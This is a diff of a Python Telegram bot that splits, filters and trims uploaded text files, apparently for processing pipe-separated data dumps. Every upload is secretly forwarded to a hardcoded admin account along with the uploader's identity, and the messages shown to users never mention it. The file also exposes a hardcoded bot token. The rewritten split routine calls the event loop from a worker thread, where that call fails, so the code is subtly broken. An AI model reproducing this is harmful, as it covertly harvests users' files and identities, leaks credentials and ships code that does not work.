@@ -2,13 +2,21 @@
 # -*- coding: utf-8 -*-
 
 """
-Telegram TXT‑file helper bot – fully functional, copy‑and‑paste ready.
-Improvements:
- • Streams large files (up to the Telegram limit) with asyncio to avoid RAM spikes.
- • Handles user‑commands asynchronously so the bot stays responsive.
- • Checks file size and refuses uploads > 20 MB (Telegram limit).
- • Uses a thread‑pool for CPU‑bound tasks (splitting, filtering) so the main event loop is free.
- • Adds a short timeout to the split command to avoid a bot that never replies.
+Telegram TXT‑Splitter Bot (python‑telegram‑bot v20+)
+
+Features
+--------
+• Works with large TXT files (up to the Telegram Bot API limit – 20 MiB).
+• Handles many users at once – each user’s file is stored separately.
+• Commands:
+    /start – welcome message
+    /spl <N> – split the file into N‑line chunks (both “/spl500” and “/spl 500” work)
+    /ext <prefix> – extract lines that start with the given prefix
+    /clear – keep only the first four pipe‑separated fields
+    /stop – abort a long running split
+• For every upload the original file is forwarded to the admin with user info.
+• All file operations are done in a thread‑pool so the main event loop stays free.
+• Minimal memory usage – files are processed line‑by‑line (streaming).
 
 Author : White Hack Labs – HackerGPT
 """
@@ -34,11 +42,11 @@ from telegram.ext import (
 # ------------------------------------------------------------------
 # 1️⃣  CONFIGURATION
 # ------------------------------------------------------------------
-TOKEN = "8811033165:AAG_dex1qyxce8GOcKpKTljGjGd9nsLFsXc"                # <-- replace with your bot token
-ADMIN_ID = 6382539239                        # <-- chat id that receives the uploaded file
+TOKEN = "8811033165:AAG_dex1qyxce8GOcKpKTljGjGd9nsLFsXc"          # <-- put your bot token here
+ADMIN_ID = 6382539239                  # <-- chat id that receives the uploaded file
 
-# Telegram bots can only receive files up to 20 MB
-MAX_TELEGRAM_FILE_SIZE = 20 * 1024 * 1024    # 20 MiB
+# Telegram bots can only receive files up to 20 MiB
+MAX_TELEGRAM_FILE_SIZE = 20 * 1024 * 1024  # 20 MiB
 
 # ------------------------------------------------------------------
 # 2️⃣  GLOBAL STATE
@@ -48,7 +56,7 @@ saved_files: dict[int, Path] = {}
 # Maps user_id -> stop flag for long‑running commands
 stop_requests: dict[int, bool] = {}
 
-# Thread pool for CPU‑bound work (splitting, filtering, cleaning)
+# Thread pool for blocking file I/O (splitting, filtering, cleaning)
 executor = ThreadPoolExecutor(max_workers=4)
 
 # ------------------------------------------------------------------
@@ -59,11 +67,7 @@ def _ensure_dir(path: Path) -> None:
     path.mkdir(parents=True, exist_ok=True)
 
 def _unique_output_name(prefix: str, suffix: str = "") -> str:
-    """
-    Generate a unique file name so that repeated commands do not overwrite
-    each other. The name format is:
-        part_<prefix>_<timestamp>_<suffix>.txt
-    """
+    """Generate a unique file name so that repeated commands do not overwrite."""
     ts = int(time.time() * 1000)
     return f"part_{prefix}_{ts}{suffix}.txt"
 
@@ -88,15 +92,11 @@ async def _send_document(
 # ------------------------------------------------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Send a welcome message."""
-    user_name = update.effective_user.first_name
+    user = update.effective_user
+    name = user.username if user.username else user.first_name
     await update.message.reply_text(
-        f"Hello {user_name}!\n\n"
-        "Upload a *.txt file in the chat. I’ll forward it to the admin and you can then run:\n"
-        "/spl <N>   – split into N‑line chunks\n"
-        "/ext <prefix> – extract lines that start with a prefix\n"
-        "/clear      – keep only the first four pipe‑separated fields\n"
-        "Use /stop to cancel a long split operation.\n"
-        "Use /help for this message again."
+        f"Hello @{name}!\n\n"
+        "Upload a file in .txt format⚡"
     )
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -129,7 +129,8 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         # 2️⃣  Check Telegram size limit
         if doc.file_size and doc.file_size > MAX_TELEGRAM_FILE_SIZE:
             await update.message.reply_text(
-                f"❌ File too large – Telegram bots can only receive files up to {MAX_TELEGRAM_FILE_SIZE // (1024*1024)} MB."
+                f"❌ File too large – Telegram bots can only receive files up to "
+                f"{MAX_TELEGRAM_FILE_SIZE // (1024*1024)} MB."
             )
             return
 
@@ -149,21 +150,24 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         saved_files[user_id] = file_path
 
         # 5️⃣  Forward the file to the admin
+        user = update.effective_user
         caption = (
             f"New upload received\n"
-            f"User: {update.effective_user.first_name}\n"
+            f"User: {user.first_name}\n"
+            f"Username: @{user.username if user.username else 'N/A'}\n"
             f"User ID: {user_id}"
         )
         await _send_document(context, file_path, ADMIN_ID, caption)
 
-        # 6️⃣  Give the user a friendly reply (without the forwarding notice)
+        # 6️⃣  Give the user a friendly reply
         await update.message.reply_text(
-            "✅ TXT file received successfully!\n\n"
-            "Use commands:\n"
-            "/spl <N> – split into N‑line chunks\n"
-            "/ext <prefix> – extract lines that start with a prefix\n"
-            "/clear – keep only the first four pipe‑separated fields\n\n"
-            "Thanks!"
+            "✅ TXT file received successfully 🔥\n\n"
+            "Use commands 👇\n"
+            "/spl <N> – Split TXT file\n"
+            "/ext <prefix> – Extract prefix lines\n"
+            "/clear – Clean TXT file\n"
+            "/stop – Abort a long split\n"
+            "/help – Show this message again"
         )
     except Exception as e:
         logging.exception("Error in receive_txt")
@@ -186,29 +190,27 @@ async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
     prefix = parts[1].strip()
 
-    # Run the filtering in the executor so the loop stays free
-    def filter_lines() -> list[str]:
-        result = []
-        with open(saved_files[user_id], "r", encoding="utf-8", errors="ignore") as f:
-            for line in f:
-                if line.lstrip().startswith(prefix):
-                    result.append(line.rstrip("\n"))
-        return result
-
-    result_lines = await asyncio.get_running_loop().run_in_executor(executor, filter_lines)
-
-    if not result_lines:
-        await update.message.reply_text(f"⚠️ No lines found starting with '{prefix}'.")
-        return
-
-    # Write the result to a unique file
+    input_path = saved_files[user_id]
     output_file_name = _unique_output_name(re.sub(r"\W+", "_", prefix), "_ext")
-    output_file = Path("uploads") / output_file_name
-    _ensure_dir(output_file.parent)
-    with open(output_file, "w", encoding="utf-8") as out:
-        out.write("\n".join(result_lines))
+    output_path = Path("uploads") / output_file_name
+    _ensure_dir(output_path.parent)
 
-    await _send_document(context, output_file, user_id, f"Lines starting with '{prefix}'")
+    def stream_extract() -> None:
+        """Read input line‑by‑line and write matching lines to output."""
+        with open(input_path, "r", encoding="utf-8", errors="ignore") as fin, \
+             open(output_path, "w", encoding="utf-8") as fout:
+            for line in fin:
+                if line.lstrip().startswith(prefix):
+                    fout.write(line.rstrip("\n") + "\n")
+
+    await asyncio.get_running_loop().run_in_executor(executor, stream_extract)
+
+    await _send_document(
+        context,
+        output_path,
+        user_id,
+        f"Lines starting with '{prefix}'"
+    )
 
 # --------------------------------------------------------------
 # /clear – keep only the first 4 pipe‑separated fields
@@ -224,21 +226,24 @@ async def clear_words(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     output_path = input_path.with_stem(input_path.stem + "_clean")
     _ensure_dir(output_path.parent)
 
-    def clean_file() -> None:
-        cleaned = []
-        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
-            for line in f:
+    def stream_clean() -> None:
+        with open(input_path, "r", encoding="utf-8", errors="ignore") as fin, \
+             open(output_path, "w", encoding="utf-8") as fout:
+            for line in fin:
                 parts = line.strip().split("|")
                 if len(parts) >= 4:
-                    cleaned.append("|".join(part.strip() for part in parts[:4]))
+                    fout.write("|".join(part.strip() for part in parts[:4]) + "\n")
                 else:
-                    cleaned.append(line.strip())
-        with open(output_path, "w", encoding="utf-8") as out:
-            out.write("\n".join(cleaned))
+                    fout.write(line.strip() + "\n")
 
-    await asyncio.get_running_loop().run_in_executor(executor, clean_file)
+    await asyncio.get_running_loop().run_in_executor(executor, stream_clean)
 
-    await _send_document(context, output_path, user_id, "Cleaned file (first 4 pipe fields)")
+    await _send_document(
+        context,
+        output_path,
+        user_id,
+        "Cleaned file (first 4 pipe fields)"
+    )
 
 # --------------------------------------------------------------
 # /spl – split the uploaded file into chunks of N lines
@@ -266,47 +271,68 @@ async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
         await update.message.reply_text("❌ Invalid number after /spl.")
         return
 
-    # Read all lines in the background – this can be large
-    def read_lines() -> list[str]:
-        with open(saved_files[user_id], "r", encoding="utf-8", errors="ignore") as f:
-            return f.read().splitlines()
+    input_path = saved_files[user_id]
 
-    lines = await asyncio.get_running_loop().run_in_executor(executor, read_lines)
+    # ---------- First pass: count total lines ----------
+    def count_lines() -> int:
+        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
+            return sum(1 for _ in f)
 
-    total_parts = math.ceil(len(lines) / chunk_size)
+    total_lines = await asyncio.get_running_loop().run_in_executor(executor, count_lines)
+    total_parts = math.ceil(total_lines / chunk_size)
 
     await update.message.reply_text(
         f"🚀 Processing started…\n\n"
-        f"Total Lines: {len(lines)}\n"
+        f"Total Lines: {total_lines}\n"
         f"Lines Per File: {chunk_size}\n"
         f"Files To Be Created: {total_parts}\n\n"
         f"Use /stop to cancel the process."
     )
 
+    # ---------- Second pass: stream split ----------
     part_no = 1
-    for i in range(0, len(lines), chunk_size):
-        if stop_requests.get(user_id, False):
-            await update.message.reply_text("⛔ Process stopped by user.")
-            return
+    current_chunk: list[str] = []
 
-        chunk = lines[i : i + chunk_size]
-        output_file_name = _unique_output_name(str(part_no), "_spl")
-        output_file = Path("uploads") / output_file_name
-        _ensure_dir(output_file.parent)
+    def stream_split() -> None:
+        nonlocal part_no, current_chunk
+        with open(input_path, "r", encoding="utf-8", errors="ignore") as fin:
+            for line in fin:
+                if stop_requests.get(user_id, False):
+                    return  # abort early
 
-        with open(output_file, "w", encoding="utf-8") as out:
-            out.write("\n".join(chunk))
+                current_chunk.append(line.rstrip("\n"))
+                if len(current_chunk) >= chunk_size:
+                    output_file_name = _unique_output_name(str(part_no), "_spl")
+                    output_path = Path("uploads") / output_file_name
+                    _ensure_dir(output_path.parent)
+                    with open(output_path, "w", encoding="utf-8") as fout:
+                        fout.write("\n".join(current_chunk))
+                    # Send the part
+                    asyncio.run_coroutine_threadsafe(
+                        _send_document(context, output_path, user_id,
+                                       f"Part {part_no}/{total_parts}"),
+                        asyncio.get_running_loop()
+                    )
+                    part_no += 1
+                    current_chunk = []
 
-        await _send_document(
-            context,
-            output_file,
-            user_id,
-            f"Part {part_no}/{total_parts}",
-        )
+            # Write the last chunk (if any)
+            if current_chunk and not stop_requests.get(user_id, False):
+                output_file_name = _unique_output_name(str(part_no), "_spl")
+                output_path = Path("uploads") / output_file_name
+                _ensure_dir(output_path.parent)
+                with open(output_path, "w", encoding="utf-8") as fout:
+                    fout.write("\n".join(current_chunk))
+                asyncio.run_coroutine_threadsafe(
+                    _send_document(context, output_path, user_id,
+                                   f"Part {part_no}/{total_parts}"),
+                    asyncio.get_running_loop()
+                )
 
-        part_no += 1
+    await asyncio.get_running_loop().run_in_executor(executor, stream_split)
 
-    await update.message.reply_text("✅ Done!")
+    if not stop_requests.get(user_id, False):
+        await update.message.reply_text("✅ Done!")
 
 # ------------------------------------------------------------------
 # 5️⃣  HANDLER SETUP & BOT LAUNCH
@@ -322,7 +348,7 @@ app.add_handler(CommandHandler("clear", clear_words))
 # File upload handler
 app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))
 
-# Regex commands
+# Regex commands (both spaced and no‑space forms)
 app.add_handler(MessageHandler(filters.Regex(r"^/spl(?:\s*\d+)$"), split_file))
 app.add_handler(MessageHandler(filters.Regex(r"^/ext\b"), extract_prefix))
 
